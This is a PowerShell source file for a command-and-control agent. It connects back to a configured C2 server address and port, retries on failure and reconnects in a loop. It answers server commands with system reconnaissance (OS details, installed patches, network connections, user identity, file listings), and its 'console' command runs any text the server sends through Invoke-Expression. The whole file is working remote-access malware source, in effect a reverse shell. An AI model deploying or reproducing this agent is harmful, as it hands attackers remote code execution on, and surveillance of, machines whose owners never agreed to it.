# This is the IP of the machine running the C2 Server.
$C2_SERVER = "127.0.0.1"
# This is the port that it has been set to listen on.
$C2_PORT = 9001
# Max attempts to retry a failed connection before exiting
$MAX_RETRIES = 10

# Given a data stream, send a String message to another host
function SendMessage($stream, $msg)
{
    $data = [text.Encoding]::Ascii.GetBytes($msg)
    $stream.Write($data, 0, $data.length)
    $stream.Flush()
}

function ReceiveData($stream, $buffer)
{
    do {
        $return = $stream.Read($buffer, 0, $buffer.Length)
        $msg += [text.Encoding]::Ascii.GetString($buffer[0..($return-1)])   
    } while ($stream.DataAvailable)

    return $msg
}

function CmdOSInfo()
{
    $str = ""
    $osInfo = Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, ServicePackMajorVersion, OSArchitecture, CSName
    $str += "Operating System : " + $osInfo.Caption + "`n"
    $str += "Architecture     : " + $osInfo.OSArchitecture + "`n"
    $str += "Service Pack     : " + $osInfo.ServicePackMajorVersion + "`n"
    $str += "Hostname         : " + $osInfo.CSName + "`n"
    $str += "Version          : " + $osInfo.Version + "`n"

    return $str
}

function CmdLS()
{
    $files = @(Get-ChildItem)
    $str = ""

    foreach ($file in $files) {
        $str += $file.Name + "`n"
    }

    return $str
}

function ProcessCommand($msg, $stream)
{
    switch -Wildcard ($msg) {
        "pwd" {
            $response = $pwd.Path
            break
        }
        "ls" {
            $response = CmdLS
            Write-Host $response
            break
        }
        "cd*" {
            $response = $msg.SubString(3, $msg.Length - 3)
            Set-Location $response
            break
        }
        "getos" {
            $response = CmdOSInfo
            break
        }
        "getpatch" {
            $response = Get-HotFix | Out-String
            break
        }
        "whoami" {
            $response = $env:ComputerName + "\" + $env:UserName
            break
        }
        "netstat" {
            $response = Get-NetTCPConnection | Out-String
            break
        }
        "scan*" {
            $msg = $msg.SubString(4, $msg.Length - 4)
            $exp = "Write-Host Function unsupported"
            # $exp = "Invoke-Portscan $msg"

            $response = Invoke-Expression($exp) | Out-String

            break
        }
        "console*" {
            $msg = $msg.SubString(8, $msg.Length - 8)

            try {
                $response = Invoke-Expression $msg | Out-String
            }
            catch {
                $response = "Command error"
            }
                
            break
        }
        "quit" {
            SendMessage $stream "C2 Agent exiting..."
            Write-Host -BackgroundColor Red "Exiting..."

            $stream.Close()

            $server.Close()
            exit 1
        }
        "ret" {
            $response = "Leaving session active..."
            break
        }
        default {
            $response = "Command not recognized"
        }
    }

    SendMessage $stream $response
}

function ServerConnect()
{
    $attempts = 0

    do {
        Write-Host "(" -NoNewline
        Write-Host $attempts") Connecting to" $C2_SERVER":"$C2_PORT "`n" -ForegroundColor Yellow

        $except = $null
        try {
            $server = New-Object System.Net.Sockets.TcpClient("127.0.0.1", 9001)
        }
        catch {
            $except = $_.Exception
        }
        Start-Sleep -Seconds 1
        $attempts += 1
    }
    while ($except -ne $null -and $attempts -le $MAX_RETRIES)

    Write-Host -ForegroundColor Green "Successfully connected to server."

    return $server
}

function GetCommand($stream)
{
    [byte[]] $buffer = New-Object byte[] 5KB
    do {
        try {
            $msg = ReceiveData $stream $buffer

            ProcessCommand $msg $stream
        }
        catch {
            $e = $_.Exception
            $msg = $e.Message

            while ($e.InnerException) {
                $e = $e.InnerException
                $msg += "`n" + $e.Message
            }

            Write-Host $msg
            Write-Host "Exiting" -ForegroundColor Yellow
            return
        }
    } while ($msg -ne "q" -and $msg -ne "quit" -and $msg -ne "exit")

    Exit
}

function Main()
{
    while ($true) {
        $server = ServerConnect

        $stream = $server.GetStream()
        GetCommand $stream
    }
}

Main